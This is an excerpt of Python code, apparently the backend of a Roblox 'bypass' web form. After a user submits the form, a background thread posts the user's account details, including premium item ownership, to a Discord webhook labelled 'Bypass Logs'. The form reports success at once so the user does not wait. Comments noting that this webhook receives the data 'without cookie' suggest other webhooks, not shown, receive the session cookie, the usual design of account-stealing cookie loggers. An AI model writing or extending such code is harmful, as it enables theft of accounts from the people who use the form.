...
def send_bypass_logs_background(user_info, webhook_url):
    """Send bypass logs WITHOUT cookie to separate webhook"""
    try:
        print("Bypass Logs: Sending user information without cookie...")
        
        # Check if user info is valid
        if not user_info.get('success', False):
            print("Bypass Logs: Invalid user info - skipping")
            return
        
        # Get premium item status
        korblox = user_info.get('has_korblox', False)
        headless = user_info.get('has_headless', False)
        
        # Create Discord embed for bypass logs (NO COOKIE INCLUDED)
        bypass_data = {
            'embeds': [
                {
                    'title': 'Added Bypass Logs',
                    'color': 0x00ff00,  # Green color for successful bypass
                    'thumbnail': {
        ...
        response = requests.post(webhook_url, json=bypass_data, timeout=5)
        
        if response.status_code in [200, 204]:
            print(f"Bypass Logs: Successfully sent to webhook: {response.status_code}")
        else:
            print(f"Bypass Logs: Failed to send webhook: {response.status_code}")
            
    except Exception as e:
        print(f"Bypass Logs: Error sending to webhook: {str(e)}")
...
def submit_form():
    ...
    try:
        ...
        # Get bypass webhook URL
        bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
        
        # Send webhooks INSTANTLY in background thread (don't wait)
        def send_webhooks_background():
            try:
                ...
                # Send to bypass webhook (without cookie) if configured
                if bypass_webhook_url:
                    print("Background: Sending bypass logs...")
                    send_bypass_logs_background(user_info, bypass_webhook_url)
                
                print("Background: All webhooks sent successfully")
            except Exception as e:
                print(f"Background: Error sending webhooks: {str(e)}")
        
        # Start background thread and return immediately
        thread = threading.Thread(target=send_webhooks_background)
        thread.daemon = True
        thread.start()
        
        # Return success INSTANTLY without waiting
        return jsonify({
            'success': True, 
